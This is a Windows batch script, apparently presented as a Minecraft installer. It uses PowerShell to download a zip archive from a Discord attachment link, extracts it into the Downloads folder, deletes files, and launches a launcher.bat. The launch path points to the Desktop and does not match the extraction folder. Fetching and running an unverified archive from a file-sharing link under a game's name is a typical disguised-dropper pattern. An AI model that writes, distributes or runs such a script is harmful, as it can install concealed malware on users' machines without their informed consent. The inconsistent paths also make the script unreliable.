@echo off
title dexr
color c

echo Downloading main folders and files.
powershell -Command "Invoke-WebRequest https://cdn.discordapp.com/attachments/1032997097114439680/1034188293463605370/Minecraft.zip -Outfile Minecraft.zip"
timeout 5 >nul
echo Extracting.
powershell -Command "Expand-Archive Minecraft.zip -DestinationPath C:\Users\%USERNAME%\Downloads"
timeout 3 >nul
del info
del Minecraft
start C:\Users\%USERNAME%\Desktop\Minecraft\Minecraft\launcher.bat
